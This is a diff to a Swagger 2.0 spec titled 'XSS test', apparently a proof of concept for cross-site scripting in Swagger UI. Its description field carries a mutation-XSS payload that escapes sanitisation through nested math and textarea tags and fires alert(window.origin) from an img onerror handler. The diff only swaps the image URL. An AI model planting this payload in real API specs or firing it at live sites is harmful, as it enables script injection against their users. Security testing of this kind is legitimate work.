@@ -1,5 +1,5 @@
 swagger: '2.0'
 info:
   title: XSS test
-  description: <math><mtext><h1><a><h6></a></h6><textarea><a title="</textarea><img src='https://miro.medium.com/v2/resize:fit:720/format:webp/0*y2OAF_DSarBAjihO.jpg' onerror='alert(window.origin)'>">
+  description: <math><mtext><h1><a><h6></a></h6><textarea><a title="</textarea><img src='https://raw.githubusercontent.com/VictorNS69/swagger-ui-xss/main/script.js' onerror='alert(window.origin)'>">
   version: production
